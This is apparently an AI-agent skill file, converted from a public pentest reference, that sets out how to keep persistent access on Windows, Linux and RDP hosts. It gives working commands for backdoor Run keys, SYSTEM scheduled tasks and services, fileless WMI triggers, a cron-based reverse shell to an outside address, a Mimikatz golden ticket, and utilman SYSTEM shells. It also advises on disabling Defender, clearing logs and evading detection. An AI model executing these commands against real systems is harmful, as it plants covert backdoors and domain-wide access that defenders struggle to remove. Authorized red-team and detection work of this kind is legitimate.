---
name: redteam-persistence
description: >-
  Establish persistence on Windows, Linux and RDP sessions: registry, scheduled tasks, services,
  WMI, startup folders, DLL search order, domain-level persistence (GPO, SID history,
  AdminSDHolder, DCShadow), and Linux cron/systemd/SSH backdoors. Use after achieving access, when
  you must survive reboots and credential rotation, or when reviewing persistence coverage for
  detection.
license: Upstream terms apply - see NOTICE.md
metadata:
  source: https://github.com/swisskyrepo/InternalAllTheThings
  source-commit: "203bb0c"
  reference-files: "5"
  generated-by: build/build.py
---

# Persistence (Windows, Linux, RDP)

Persistence is an autostart trigger bound to a privilege level. You already hold some level of
access; the question is which trigger fires at that level, survives a reboot or a credential
rotation, and does not look like the first thing an analyst greps for. Done means the trigger is
documented, verified across a reboot or logon, and can be removed cleanly at the end of the
engagement.

## When to use this skill

- You have a stable session and need it to survive reboot, logoff, or the password being changed.
- You hold local admin / SYSTEM and want machine-wide or service-level persistence rather than a
  per-user trigger.
- You hold domain admin and need persistence that survives re-imaging a single host (golden
  certificate, golden ticket, LAPS).
- You need the RDP login screen without credentials (utilman/sethc) or want to observe a session
  (shadowing).
- Use `redteam-privilege-escalation` first if you do not yet hold the privilege the trigger needs;
  `redteam-defense-evasion` to keep the payload from being quarantined; `c2-frameworks` for the
  Persistence Kit and beacon-side persistence.

## First moves

1. **User-level registry Run key** — the cheapest trigger, fires at logon in the user's context:

   ```powershell
   reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Evil /t REG_SZ /d "C:\Users\user\backdoor.exe"
   ```

2. **SYSTEM scheduled task that repeats every minute** — verifies immediately, survives reboot:

   ```powershell
   schtasks /create /sc minute /mo 1 /tn "eviltask" /tr C:\tools\shell.cmd /ru "SYSTEM"
   ```

3. **Auto-start service running as LocalSystem** — note the mandatory space after `binpath=`:

   ```powershell
   sc create Backdoor binpath= "cmd.exe /k C:\temp\backdoor.exe" start="auto" obj="LocalSystem"
   sc start Backdoor
   ```

4. **Fileless WMI event subscription** — filter + consumer + binding; nothing is written to disk:

   ```powershell
   wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="WMIPersist", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
   wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="WMIPersist", ExecutablePath="C:\Windows\System32\binary.exe",CommandLineTemplate="C:\Windows\System32\binary.exe"
   wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"WMIPersist\"", Consumer="CommandLineEventConsumer.Name=\"WMIPersist\""
   ```

5. **Linux reboot trigger without root** — a user crontab entry that reconnects after every boot:

   ```bash
   (crontab -l ; echo "@reboot sleep 200 && ncat 10.10.10.10 4242 -e /bin/bash")|crontab 2> /dev/null
   ```

6. **Domain-level forgery once you hold krbtgt** — a golden ticket is persistence that survives host
   re-imaging, and is only killed by rotating krbtgt twice:

   ```powershell
   kerberos::purge
   kerberos::golden /user:evil /domain:pentestlab.local /sid:S-1-5-21-3737340914-2019594255-2413685307 /krbtgt:d125e4f69c851529045ec95ca80fa37e /ticket:evil.tck /ptt
   ```

7. **Login-screen SYSTEM shell over RDP** — IFEO `Debugger` on `utilman.exe`, triggered with Win+U:

   ```powershell
   REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
   ```

## Reference map

Read by the privilege level you already hold, then the platform: user → elevated → domain →
Linux → RDP.

| Reference | Read it when | Key content |
|---|---|---|
| [windows-persistence-user.md](references/windows-persistence-user.md) | you are a plain user on the host | hiding binaries with `attrib`, disabling Defender/firewall and clearing logs, HKCU Run/RunOnce, NTUSER.MAN offline hive, Startup folder, user schtasks, BITS jobs, COM TypeLib, SharPersist |
| [windows-persistence-elevated.md](references/windows-persistence-elevated.md) | you have local admin or SYSTEM | IIS module backdoor, HKLM Run, Winlogon `Userinit`/`Shell`, IFEO `GlobalFlag`+`SilentProcessExit`, ProgramData Startup, auto-start services, `sc sdset scmanager`, SYSTEM schtasks, WMI event subscription, binary replacement (sethc/utilman/osk), skeleton key, Shadow Bunny VM, WSL |
| [windows-persistence-domain.md](references/windows-persistence-domain.md) | you hold domain admin / ADCS access | user certificate → TGT, golden certificate with `ForgeCert`, golden ticket with Mimikatz, LAPS expiration-time tampering |
| [linux-persistence.md](references/linux-persistence.md) | the host is Linux | reverse-shell listeners, uid-0 user, SUID binary, crontab, `.bashrc`/`.zshrc` and fake-sudo alias, `if-up.d`, systemd user service and system timer, motd, autostart `.desktop`, udev rule, `apt.conf.d` pre-invoke, SSH `authorized_keys`, git config variables and hooks |
| [rdp-persistence.md](references/rdp-persistence.md) | you need the RDP login screen or session observation | utilman/sethc IFEO `Debugger`, RDP shadowing registry values, `quser`/`qwinsta`, `mstsc /shadow /noConsentPrompt`, `tscon` fallback |

## Workflow

1. **Fix the requirement and the privilege level.** "Survive reboot" and "survive credential
   rotation" are different problems; so are user context, SYSTEM and domain. Pick the lowest level
   that satisfies the requirement — user-level triggers are quieter and easier to clean up.
2. **User-context branch.** HKCU Run/RunOnce, Startup folder, user scheduled task, BITS job. If
   registry telemetry is the concern, pre-seed the hive offline as `NTUSER.MAN` instead of touching
   the live registry. `COM TypeLib` and `GlobalFlag` are alternatives when Run keys are watched.
3. **Elevated branch.** HKLM Run, Winlogon `Userinit`/`Shell`, IFEO `GlobalFlag`, ProgramData
   Startup, an auto-start service, a SYSTEM scheduled task, or a WMI subscription. Choose by what the
   host already does: a service that already runs as SYSTEM blends in better than a new one; a WMI
   subscription leaves no file on disk but is a well-known detection.
4. **Domain branch (domain admin only).** Golden certificate if you can export the CA key (survives
   password resets and host rebuilds), golden ticket if you have krbtgt, LAPS expiration tampering if
   you only need to keep a machine's local-admin password. Coordinate with
   `active-directory-certificates` and `active-directory-kerberos` for the prerequisite material.
5. **Linux branch by privilege.** Without root: user crontab, `.bashrc`/`.zshrc`, systemd user
   service, autostart `.desktop`, git hooks. With root: systemd timer, udev rule, `apt.conf.d`
   pre-invoke, motd, `if-up.d`, SUID binary, extra uid-0 account. `authorized_keys` is the quietest
   cross-reboot access if SSH is exposed.
6. **RDP branch.** IFEO `utilman.exe`/`sethc.exe` gives a SYSTEM shell at the login screen; RDP
   shadowing is for observing an existing session, not for persistence — treat it as access, not a
   backdoor.
7. **Verify and record.** Reboot or log off and confirm the trigger fires, then write down the exact
   key / unit / task name so cleanup is possible. Leftover persistence is the usual red-team finding.

## Gotchas

- `NTUSER.MAN` turns the profile into a mandatory profile: every registry and profile change made
  during the session is discarded at logoff, the hive loads only at full logon, and removing it later
  needs admin. It is a persistence mechanism, not a live backdoor.
- IFEO `sethc.exe`/`utilman.exe` replacement needs admin to write HKLM and shows `cmd.exe` as SYSTEM
  on the console — it works, but it is one of the most-detected persistence techniques in existence.
- The `GlobalFlag` chain needs all three values (`GlobalFlag=512`, `ReportingMode=1`,
  `MonitorProcess`); setting only one produces no execution and no error.
- Service creation writes Event 7045, and every `smbexec`/`psexec` command creates a service — expect
  the same log line as your persistence.
- `sc sdset scmanager D:(A;;KA;;;WD)` grants every user service-control rights persistently; it is
  loud enough that defenders usually find it before you use it.
- Scheduled tasks created as SYSTEM show `taskeng.exe` as the parent of the spawned process — a
  parent-child pair that stands out on modern EDR.
- BITS persistence needs `SetNotifyCmdLine`; the v2 `regsvr32` form only fires if the download
  succeeds.
- COM TypeLib hijack needs a real `RegOpenKey` `NAME NOT FOUND` from Procmon; a guessed CLSID does
  nothing.
- WMI subscriptions must be removed in order (binding, then consumer, then filter) or the leftovers
  keep firing.
- Linux: the systemd-timer example in the reference creates `backdoor.timer` but the enable command
  names a different unit — enable the timer file you actually created. Also reload
  (`systemctl daemon-reload`) after writing a unit.
- Linux `authorized_keys` must be `600` inside a `700` `~/.ssh`; wrong permissions make SSH ignore
  the key with no obvious error. `authorized_keys2` is legacy.
- Git hooks require `chmod +x`; setting `core.hooksPath` globally breaks every repository-specific
  hook and is therefore noticeable.
- Skeleton key is injected into the DC's LSASS and disappears on reboot — it is a short-lived
  domain-wide backdoor, not durable persistence, and it needs DA/`SeDebugPrivilege` on the DC.
- RDP shadowing requires `TermService` running, SYSTEM or the user's password, and usually the
  `Remote Desktop - Shadow (TCP-In)` firewall rule enabled; `Shadow=2` is full control without
  consent.

## Authorized use

For authorized engagements only, with explicit permission and within the agreed scope. Persistence
changes the target's state — record every trigger you create and remove it during decommissioning.

## Source

Converted from the upstream InternalAllTheThings guides
(https://github.com/swisskyrepo/InternalAllTheThings), see NOTICE.md.
